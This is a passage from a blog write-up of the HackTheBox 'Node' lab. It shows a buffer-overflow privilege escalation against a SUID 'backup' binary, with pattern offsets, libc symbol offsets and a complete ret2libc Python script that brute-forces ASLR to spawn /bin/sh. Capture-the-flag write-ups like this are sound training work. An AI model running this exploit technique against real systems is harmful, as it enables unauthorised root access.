</pre><td class="rouge-code"><pre> gdb-peda$ r asdf a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Node/images/Pasted%20image%2020220827233050.png" alt="" data-proofer-ignore></p><li>Determine EIP offset<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/node/10.10.10.58/loot]
 └─# msf-pattern_offset -q 0x31724130
 [*] Exact match at offset 512
</pre></table></code></div></div><ul><li>EIP Offset: <code class="language-plaintext highlighter-rouge">512</code></ul><li><code class="language-plaintext highlighter-rouge">ret2libc.py</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre> #!/usr/bin/env python
 import struct
 from subprocess import call
		
 libc_base_addr = 
 system_off = 
 exit_off = 
 arg_off = 
		
 system_addr = struct.pack("&lt;I", libc_base_addr+system_off)
 exit_addr = struct.pack("&lt;I",libc_base_addr+exit_off)
 arg_addr = struct.pack("&lt;I",lib_base_addr+arg_off)
		
 buf = "A" * 512
 buf += system_addr
 buf += exit_addr
 buf += arg_addr
		
 i=0
 while (i&lt;512):
         print "Try %s" %i
         i += 1
         ret = call(["/usr/local/bin/backup", buf])
</pre></table></code></div></div><li>Obtain <code class="language-plaintext highlighter-rouge">lib_base_addr</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre> tom@node:/tmp$ ldd /usr/local/bin/backup | grep libc.so.6
     libc.so.6 =&gt; /lib32/libc.so.6 (0xf7529000)
 tom@node:/tmp$ ldd /usr/local/bin/backup | grep libc.so.6
     libc.so.6 =&gt; /lib32/libc.so.6 (0xf7563000)
 tom@node:/tmp$ ldd /usr/local/bin/backup | grep libc.so.6
     libc.so.6 =&gt; /lib32/libc.so.6 (0xf7551000)
 tom@node:/tmp$ ldd /usr/local/bin/backup | grep libc.so.6
     libc.so.6 =&gt; /lib32/libc.so.6 (0xf75f5000)
 tom@node:/tmp$ ldd /usr/local/bin/backup | grep libc.so.6
     libc.so.6 =&gt; /lib32/libc.so.6 (0xf760d000)
 tom@node:/tmp$ ldd /usr/local/bin/backup | grep libc.so.6
     libc.so.6 =&gt; /lib32/libc.so.6 (0xf756a000)
</pre></table></code></div></div><ul><li>Changes because of <code class="language-plaintext highlighter-rouge">ASLR</code>, but eventually we’ll get it correct<li><code class="language-plaintext highlighter-rouge">lib_base_addr = 0xf7529000</code><li>At the first attempt of <code class="language-plaintext highlighter-rouge">ret2libc.py</code>, I got a bad character, causing the trollface output, change address if that happens</ul><li>Obtain <code class="language-plaintext highlighter-rouge">system_off</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre> tom@node:/tmp$ readelf -s /lib32/libc.so.6 | grep system
    245: 00110820    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
    627: 0003a940    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
   1457: 0003a940    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">system_off = 0x0003a940</code></ul><li>Obtain <code class="language-plaintext highlighter-rouge">exit_off</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> tom@node:/tmp$ readelf -s /lib32/libc.so.6 | grep ' exit@@'
    141: 0002e7b0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">exit_off = 0x0002e7b0</code></ul><li>Obtain <code class="language-plaintext highlighter-rouge">arg_off</code> - where <code class="language-plaintext highlighter-rouge">/bin/sh</code> is<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> tom@node:/tmp$ strings -a -t x /lib32/libc.so.6 | grep bin/sh
  15900b /bin/sh
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">/arg_off = 0x00015900b</code></ul><li>Final <code class="language-plaintext highlighter-rouge">ret2libc.py</code> script<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre> from subprocess import call
 import struct
		
 libc_base_addr = 0xf7529000
		
 system_off     = 0x0003a940 
 exit_off       = 0x0002e7b0
 arg_off        = 0x00015900b
		
 system_addr = struct.pack("&lt;I", libc_base_addr+system_off)
 exit_addr = struct.pack("&lt;I",libc_base_addr+exit_off)
 arg_addr = struct.pack("&lt;I",libc_base_addr+arg_off)
		
 buf = "A" * 512
 buf += system_addr
 buf += exit_addr
 buf += arg_addr
		
 i=0
 while (i&lt;512):
     i += 1
     ret = call(["/usr/local/bin/backup","ippsec","45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474",buf])
     print "Try %s" %i
</pre></table></code></div></div><li>Run <code class="language-plaintext highlighter-rouge">ret2libc.py</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Node/images/vmware_2Rq38yby4F.gif" alt="" data-proofer-ignore></ol></ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/hackthebox-linux/'>HackTheBox - Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/exploit-command-injection/" class="post-tag no-text-decoration" >exploit/command-injection</a> <a href="/tags/linux-priv-esc-linux-creds-found/" class="post-tag no-text-decoration" >linux-priv-esc/linux-creds-found</a> <a href="/tags/bof-linux-bof/" class="post-tag no-text-decoration" >bof/linux-bof</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox - Node - Yufong&amp;u=https://yufongg.github.io/posts/Node/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="" data-toggle="tooltip" data-placement="top" title="" target="_blank" rel="noopener" aria-label=""> <i class="fa-fw "></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Blunder/">HackTheBox - Blunder</a><li><a href="/posts/Attacktive-Directory/">TryHackMe - Attacktive Directory</a><li><a href="/posts/Tommy-Boy-1/">Vulnhub - Tommy Boy 1</a><li><a href="/posts/Tiki-1/">Vulnhub - Tiki 1</a><li><a href="/posts/Breach-1/">Vulnhub - Breach 1</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Bob-1.0.1/"><div class="card-body"> <em class="timeago small" data-ts="1643990400" > 2022-02-05 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Vulnhub - Bob 1.0.1</h3><div class="text-muted small"><p> Recon NMAP Complete Scan # Nmap 7.92 scan initiated Sat Jan 22 15:05:40 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Bob1.0.1/192.168.236.5/scans...</p></div></div></a></div><div class="card"> <a href="/posts/Pinky's-Palace-v1/"><div class="card-body"> <em class="timeago small" data-ts="1644595200" > 2022-02-12 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Vulnhub - Pinky's Palace v1</h3><div class="text-muted small"><p> Recon NMAP Complete Scan # Nmap 7.92 scan initiated Sat Feb 12 01:47:10 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/PinkysPalaceV1/192.168.110.2...</p></div></div></a></div><div class="card"> <a href="/posts/Node-1/"><div class="card-body"> <em class="timeago small" data-ts="1647100800" > 2022-03-13 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Vulnhub - Node 1</h3><div class="text-muted small"><p> Recon TCP/3000 (HTTP) FFUF ┌──(root💀kali)-[~/vulnHub/Node-1] └─# ffuf -u http://$ip:3000/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php,.cgi,.log&#39; -fw 727 /&#39;___\ /&#39;___\...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/SolidState/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox - SolidState</p></a> <a href="/posts/Valentine/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox - Valentine</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://yufongg.github.io/posts/Node/'; this.page.identifier = '/posts/Node/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://yufongg-github-io.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/yufongg">yufongg</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-LS5TVPBBZE"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-LS5TVPBBZE'); }); </script>
